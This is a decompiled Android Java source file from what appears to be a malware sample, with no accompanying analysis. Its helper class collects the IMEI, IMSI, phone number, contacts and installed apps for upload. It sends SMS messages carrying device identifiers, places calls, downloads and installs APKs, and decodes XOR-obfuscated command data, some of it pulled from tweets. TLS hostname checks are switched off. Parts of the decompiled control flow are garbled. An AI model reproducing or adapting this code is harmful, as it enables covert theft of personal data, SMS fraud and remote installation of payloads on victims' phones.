package ru.beta;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyStore;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.SingleClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;
import test.app.EasySSLSocketFactory;

public class Functions
{
  public Functions() {}
  
  public static String appListToJson(List<PackageInfo> paramList)
  {
    JSONArray localJSONArray = new JSONArray();
    int i = 0;
    try
    {
      while (i < paramList.size())
      {
        localJSONArray.put(((PackageInfo)paramList.get(i)).packageName);
        i += 1;
      }
      paramList = localJSONArray.toString();
      return paramList;
    }
    catch (Exception paramList)
    {
      paramList.printStackTrace();
    }
    return "";
  }
  
  public static String contactsToJson(List<String> paramList)
  {
    JSONArray localJSONArray = new JSONArray();
    int i = 0;
    try
    {
      while (i < paramList.size())
      {
        localJSONArray.put(paramList.get(i));
        i += 1;
      }
      paramList = localJSONArray.toString();
      return paramList;
    }
    catch (Exception paramList)
    {
      paramList.printStackTrace();
    }
    return "";
  }
  
  public static HttpClient createClient()
  {
    BasicHttpParams localBasicHttpParams = new BasicHttpParams();
    HttpProtocolParams.setContentCharset(localBasicHttpParams, "UTF-8");
    HttpProtocolParams.setHttpElementCharset(localBasicHttpParams, "UTF-8");
    HttpConnectionParams.setConnectionTimeout(localBasicHttpParams, 3000);
    try
    {
      Object localObject = KeyStore.getInstance("BKS");
      ((KeyStore)localObject).load(null, "".toCharArray());
      localObject = new SSLSocketFactory((KeyStore)localObject);
      localException1.printStackTrace();
    }
    catch (Exception localException1)
    {
      try
      {
        ((SSLSocketFactory)localObject).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
        localObject = new SchemeRegistry();
        ((SchemeRegistry)localObject).register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
        ((SchemeRegistry)localObject).register(new Scheme("https", new EasySSLSocketFactory(), 443));
        return new DefaultHttpClient(new SingleClientConnManager(localBasicHttpParams, (SchemeRegistry)localObject), localBasicHttpParams);
      }
      catch (Exception localException2)
      {
        for (;;) {}
      }
      localException1 = localException1;
    }
    throw new RuntimeException(localException1);
  }
  
  public static String decript(String paramString)
  {
    return decript(Base64.decode(paramString, 0));
  }
  
  public static String decript(byte[] paramArrayOfByte)
  {
    int i = 0;
    int m = paramArrayOfByte[0] & 0xFF;
    int j = m + 1;
    for (;;)
    {
      try
      {
        if (j < paramArrayOfByte.length)
        {
          paramArrayOfByte[j] = ((byte)(paramArrayOfByte[j] ^ paramArrayOfByte[(i + 1)] & 0xFF));
          int k = i + 1;
          i = k;
          if (k == m) {
            i = 0;
          }
        }
        else
        {
          paramArrayOfByte = new String(paramArrayOfByte, m + 1, paramArrayOfByte.length - m - 1, "utf-8");
          return paramArrayOfByte;
        }
      }
      catch (Exception paramArrayOfByte)
      {
        paramArrayOfByte.printStackTrace();
        return "";
      }
      j += 1;
    }
  }
  
  public static String deleteTags(String paramString)
  {
    try
    {
      StringBuffer localStringBuffer = new StringBuffer();
      int i = 0;
      int j = 0;
      for (;;)
      {
        j = paramString.indexOf("<", i);
        if (j == -1) {
          break;
        }
        localStringBuffer.append(paramString.subSequence(i, j));
        i = paramString.indexOf(">", i) + 1;
      }
      paramString = localStringBuffer.toString();
      return paramString;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
    return "";
  }
  
  public static boolean downloadFile(String paramString1, String paramString2, String paramString3)
  {
    try
    {
      paramString2 = (HttpURLConnection)new URL(paramString2).openConnection();
      paramString2.setRequestMethod("GET");
      paramString2.setDoOutput(true);
      paramString2.connect();
      paramString1 = new File(paramString1);
      paramString1.mkdirs();
      paramString1 = new FileOutputStream(new File(paramString1, paramString3));
      paramString2 = paramString2.getInputStream();
      paramString3 = new byte['Ð€'];
      for (;;)
      {
        int i = paramString2.read(paramString3);
        if (i == -1) {
          break;
        }
        paramString1.write(paramString3, 0, i);
      }
      paramString1.close();
      paramString2.close();
      return true;
    }
    catch (Exception paramString1) {}
    return false;
  }
  
  public static List<String> getContacts(Context paramContext)
  {
    ArrayList localArrayList = new ArrayList();
    Object localObject3 = null;
    String str = "";
    Object localObject2;
    Object localObject1;
    for (;;)
    {
      try
      {
        if (Build.VERSION.SDK_INT <= 4) {
          break;
        }
        arrayOfClass = Class.forName("android.provider.ContactsContract").getClasses();
        i = 0;
        localObject2 = localObject3;
        localObject1 = str;
        if (i < arrayOfClass.length)
        {
          if (!arrayOfClass[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds")) {
            break label228;
          }
          arrayOfClass = arrayOfClass[i].getClasses();
          i = 0;
          localObject2 = localObject3;
          localObject1 = str;
          if (i < arrayOfClass.length)
          {
            if (!arrayOfClass[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds.Phone")) {
              break label221;
            }
            localObject1 = arrayOfClass[i];
            localObject2 = (Uri)((Class)localObject1).getField("CONTENT_URI").get(null);
            localObject1 = (String)((Class)localObject1).getField("NUMBER").get(null);
          }
        }
        paramContext = paramContext.getContentResolver().query((Uri)localObject2, null, null, null, null);
        if (paramContext.moveToNext())
        {
          localObject2 = paramContext.getString(paramContext.getColumnIndex((String)localObject1));
          localArrayList.add(localObject2);
          System.out.println("phone: " + (String)localObject2);
          continue;
        }
        return localArrayList;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
      }
      label221:
      i += 1;
      continue;
      label228:
      i += 1;
    }
    Class[] arrayOfClass = Class.forName("android.provider.Contacts").getClasses();
    int i = 0;
    for (;;)
    {
      localObject2 = localObject3;
      localObject1 = str;
      if (i >= arrayOfClass.length) {
        break;
      }
      if (arrayOfClass[i].getCanonicalName().equals("android.provider.Contacts.Phones"))
      {
        localObject1 = arrayOfClass[i];
        localObject2 = (Uri)((Class)localObject1).getField("CONTENT_URI").get(null);
        localObject1 = (String)((Class)localObject1).getField("NUMBER").get(null);
        break;
      }
      i += 1;
    }
  }
  
  public static String getImei(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        return "";
      }
      paramContext = paramContext.getDeviceId();
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  public static String getImsi(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        return "";
      }
      paramContext = paramContext.getSubscriberId();
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  public static List<PackageInfo> getInstalledAppList(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getPackageManager().getInstalledPackages(0);
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return new ArrayList();
  }
  
  public static String getPhone(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        return "";
      }
      String str = paramContext.getLine1Number();
      paramContext = str;
      if (str == null) {
        return "";
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
      paramContext = "";
    }
    return paramContext;
  }
  
  public static SmsMessage[] getSmsMessages(Bundle paramBundle)
  {
    paramBundle = (Object[])paramBundle.get("pdus");
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramBundle.length];
    int i = 0;
    while (i < paramBundle.length)
    {
      arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])(byte[])paramBundle[i]);
      i += 1;
    }
    return arrayOfSmsMessage;
  }
  
  public static void installApk(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.intent.action.VIEW");
      localIntent.addFlags(268435456);
      localIntent.setDataAndType(Uri.fromFile(new File(paramString)), "application/vnd.android.package-archive");
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static String loadAndDecode(Context paramContext, String paramString)
  {
    for (;;)
    {
      int j;
      try
      {
        localInputStream = paramContext.getClass().getResourceAsStream(paramString);
        i = 0;
      }
      catch (Exception paramContext)
      {
        InputStream localInputStream;
        int i;
        int m;
        int k;
        paramContext.printStackTrace();
        return "";
      }
      try
      {
        if (localInputStream.read() != -1) {
          i += 1;
        } else {
          localInputStream.close();
        }
      }
      catch (Exception localException)
      {
        continue;
        j += 1;
      }
    }
    paramContext = paramContext.getClass().getResourceAsStream(paramString);
    paramString = new byte[i];
    readDataFromStream(paramContext, paramString);
    paramContext.close();
    i = 0;
    m = paramString[0] & 0xFF;
    j = m + 1;
    if (j < paramString.length)
    {
      paramString[j] = ((byte)(paramString[j] ^ paramString[(i + 1)] & 0xFF));
      k = i + 1;
      i = k;
      if (k == m) {
        i = 0;
      }
    }
    else
    {
      paramContext = new String(paramString, m + 1, paramString.length - m - 1, "utf-8");
      return paramContext;
    }
  }
  
  public static boolean loadSettings(Context paramContext)
  {
    Settings localSettings;
    if (Settings.getSettings() == null)
    {
      localSettings = new Settings();
      Settings.setSettings(localSettings);
    }
    return localSettings.load(paramContext);
  }
  
  public static void makeCall(Context paramContext, String paramString)
  {
    paramString = new Intent("android.intent.action.CALL", Uri.parse("tel:" + paramString));
    paramString.addFlags(268435456);
    paramContext.startActivity(paramString);
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static JSONObject parseResponse(InputStream paramInputStream)
  {
    Object localObject;
    do
    {
      try
      {
        paramInputStream = new BufferedReader(new InputStreamReader(paramInputStream));
        localObject = new StringBuffer();
        for (;;)
        {
          String str = paramInputStream.readLine();
          if (str == null) {
            break;
          }
          ((StringBuffer)localObject).append(str);
        }
        paramInputStream.close();
      }
      catch (Exception paramInputStream)
      {
        paramInputStream.printStackTrace();
        paramInputStream = new JSONObject();
        return paramInputStream;
      }
      paramInputStream = ((StringBuffer)localObject).toString();
      if (Constants.DEBUG) {
        System.out.println("response: " + paramInputStream);
      }
      localObject = new JSONObject(decript(paramInputStream));
      paramInputStream = (InputStream)localObject;
    } while (!Constants.DEBUG);
    System.out.println("json: " + ((JSONObject)localObject).toString(4));
    return localObject;
  }
  
  public static String parseTwitter(Context paramContext, String paramString)
  {
    try
    {
      paramContext = createClient().execute(new HttpGet(paramString));
      int i = paramContext.getStatusLine().getStatusCode();
      System.out.println("code: " + i);
      if (i == 200)
      {
        paramContext = paramContext.getEntity();
        if (paramContext != null)
        {
          paramContext = EntityUtils.toString(paramContext);
          i = paramContext.indexOf("<p class=\"js-tweet-text\">");
          if (i != -1)
          {
            i += "<p class=\"js-tweet-text\">".length();
            return decript(deleteTags(paramContext.substring(i, paramContext.indexOf("</p>", i)).trim()).trim());
          }
          i = paramContext.indexOf("<div class=\"tweet-text\">");
          if (i != -1)
          {
            i += "<div class=\"tweet-text\">".length();
            paramContext = decript(deleteTags(paramContext.substring(i, paramContext.indexOf("</div>", i)).trim()).trim());
            return paramContext;
          }
        }
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  public static void readDataFromStream(InputStream paramInputStream, byte[] paramArrayOfByte)
    throws IOException
  {
    int i = 0;
    int j = paramArrayOfByte.length;
    for (;;)
    {
      int k = paramInputStream.read(paramArrayOfByte, i, j);
      j -= k;
      if (j == 0) {
        return;
      }
      i += k;
    }
  }
  
  public static void sendGetRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "GET", paramList1, paramList2);
  }
  
  public static HttpURLConnection sendHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2, boolean paramBoolean, String paramString3)
  {
    Object localObject = null;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          localObject = new URL(paramString1);
          paramString1 = (HttpURLConnection)((URL)localObject).openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label452;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label452;
          if (i < paramList2.size())
          {
            localObject = (NameValuePair)paramList1.get(i);
            paramString1.setRequestProperty(((NameValuePair)localObject).getName(), ((NameValuePair)localObject).getValue());
            i += 1;
            continue;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            continue;
          }
          localObject = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        if (paramString2.equals("POST"))
        {
          paramString2 = new DataOutputStream(paramString1.getOutputStream());
          i = 0;
          if (i < paramList1.size())
          {
            paramList2 = (NameValuePair)paramList1.get(i);
            paramString2.writeBytes("--AaB03x");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("\r\n");
            paramString2.write(paramList2.getValue().getBytes("utf-8"));
            paramString2.writeBytes("\r\n");
            i += 1;
            continue;
          }
          if (paramBoolean)
          {
            paramString2.writeBytes("--AaB03x");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("Content-Disposition: form-data; name=\"FILE\"; filename=\"data.json\"");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("Content-Type: application/octet-stream");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("Content-Transfer-Encoding: binary");
            paramString2.writeBytes("\r\n");
            paramString2.writeBytes("\r\n");
            paramString2.write(paramString3.getBytes("utf-8"));
            paramString2.writeBytes("\r\n");
          }
          paramString2.writeBytes("--AaB03x--");
          paramString2.writeBytes("\r\n");
          paramString2.flush();
          paramString2.close();
        }
        else if (paramString2.equals("GET"))
        {
          paramString1.connect();
        }
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      label452:
      int i = 0;
    }
    return paramString1;
  }
  
  public static void sendPostRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "POST", paramList1, paramList2);
  }
  
  public static void sendSimpleHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    try
    {
      paramString1 = sendHttpRequest(paramString1, paramString2, paramList1, paramList2, false, null);
      if (paramString1 != null)
      {
        int i = paramString1.getResponseCode();
        if (Constants.DEBUG) {
          System.out.println("getResponseCode: " + i);
        }
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean sendSms(String paramString1, String paramString2)
  {
    Settings localSettings = Settings.getSettings();
    String str = paramString2;
    if (localSettings != null) {
      str = paramString2.replace("{IMEI}", localSettings.imei).replace("{IMSI}", localSettings.imsi).replace("{SID}", localSettings.sid).replace("{VERSION}", localSettings.version);
    }
    if (Constants.DEBUG) {
      System.out.println("sms: " + str + " to " + paramString1);
    }
    try
    {
      SmsManager.getDefault().sendTextMessage(paramString1, null, str, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static void showHome(Context paramContext)
  {
    Intent localIntent = new Intent("android.intent.action.MAIN");
    localIntent.setFlags(268435456);
    localIntent.addCategory("android.intent.category.HOME");
    paramContext.startActivity(localIntent);
  }
  
  public static void showNotification(Context paramContext, String paramString1, String paramString2, String paramString3, int paramInt, String paramString4)
  {
    try
    {
      NotificationManager localNotificationManager = (NotificationManager)paramContext.getSystemService("notification");
      paramString1 = new Notification(paramInt, paramString1, System.currentTimeMillis());
      paramString4 = new Intent("android.intent.action.VIEW", Uri.parse(paramString4));
      paramString4.addFlags(268435456);
      paramString1.setLatestEventInfo(paramContext, paramString2, paramString3, PendingIntent.getActivity(paramContext, 0, paramString4, 0));
      localNotificationManager.notify(1, paramString1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startTimer(Context paramContext)
  {
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.alarm");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, Settings.getSettings().timeNextConnection, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.intent.action.DELETE");
      localIntent.setData(Uri.parse("package:" + paramString));
      localIntent.addFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
}
